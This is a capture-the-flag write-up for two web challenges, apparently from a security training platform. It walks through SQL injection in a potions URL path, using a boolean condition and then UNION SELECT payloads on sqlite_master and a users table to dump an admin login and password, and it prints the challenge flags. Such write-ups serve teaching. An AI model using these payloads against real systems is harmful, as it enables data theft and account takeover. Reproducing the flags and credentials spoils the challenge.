### SQLI

## potionseller

We are welcomed with a website on which we can click and get more information with every potion exept one the "My strongest potion"

![1.png](asset/1.png)
![2.png](asset/2.png)

If we check if there is anything special when we take potions one by one we can see that a "longdescription" section appears

![3.png](asset/3.png)
However when we check out the same thing for potion 4 namely "My strongest potion" we receive and error telling us "That potion is too strong for you, traveller!"

So if we try to get the first id that is higher than 3 then we should get the potion id 4

https://potionseller.secu-web.blackfoot.dev/potions/id and id > 3

![4.png](asset/4.png)

>[!IMPORTANT]
BFS{I_n33d_y0uR_5tr0ng3St_p07ion!}

## Potionseller2

we can see that there is a admin panel that appeared so we will need to look for the admin's username/password

once again we can see that the /potions/ work so we will work from there

/potions/0 work

/potions/0) raise a error near ")" meaning that the code has a closing ")" so we need to comment it

/potions/0)-- work

![5.png](asset/5.png)

By checking out the sqlite_master we can see each table one by one

![6.png](asset/6.png)
Nothing interesting here so from there we will keep going and look for another table

https://potionseller2.secu-web.blackfoot.dev/potions/NULL) union select name, sql, NULL,NULL,NULL,NULL from sqlite_master limit 1 offset 2 --

![7.png](asset/7.png)

https://potionseller2.secu-web.blackfoot.dev/potions/NULL) union select *, null, null, null from users--

get username + hashed pass (desc)
![8.png](asset/8.png)
![8.png](asset/9.png)

### login: **potionSellerRoot**

### Password: **potions**
We can now connect to the admin panel

>[!IMPORTANT]
> BFS{Y4Y_f0R_5qLi!}
